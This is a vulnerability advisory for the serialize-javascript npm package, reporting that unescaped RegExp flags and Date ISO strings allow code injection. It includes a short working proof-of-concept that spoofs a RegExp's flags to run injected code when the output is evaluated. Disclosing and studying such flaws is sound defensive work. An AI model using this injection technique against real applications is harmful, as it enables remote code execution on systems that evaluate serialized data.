title: "Serialize JavaScript is Vulnerable to RCE via RegExp.flags and Date.prototype.toISOString()"
description: "The serialize-javascript npm package (versions <= 7.0.2) contains a
  code injection vulnerability. It is an incomplete fix for CVE-2020-7660.\n\nWhile
  `RegExp.source` is sanitized, `RegExp.flags` is interpolated directly into the generated
  output without escaping. A similar issue exists in `Date.prototype.toISOString()`.\n\nIf
  an attacker can control the input object passed to `serialize()`, they can inject
  malicious JavaScript via the flags property of a RegExp object. When the serialized
  string is later evaluated (via `eval`, `new Function`, or `<script>` tags), the
  injected code executes.\n\n```javascript\nconst serialize = require('serialize-javascript');\n//
  Create an object that passes instanceof RegExp with a spoofed .flags\nconst fakeRegex
  = Object.create(RegExp.prototype);\nObject.defineProperty(fakeRegex, 'source', {
  get: () => 'x' });\nObject.defineProperty(fakeRegex, 'flags', {\nget: () => '\"+(global.PWNED=\"CODE_INJECTION_VIA_FLAGS\")+\"'\n});\nfakeRegex.toJSON
  = function() { return '@placeholder'; };\nconst output = serialize({ re: fakeRegex
  });\n// Output: {\"re\":new RegExp(\"x\", \"\"+(global.PWNED=\"CODE_INJECTION_VIA_FLAGS\")+\"\")}\nlet
  obj;\neval('obj = ' + output);\nconsole.log(global.PWNED); // \"CODE_INJECTION_VIA_FLAGS\"
  — injected code executed!"
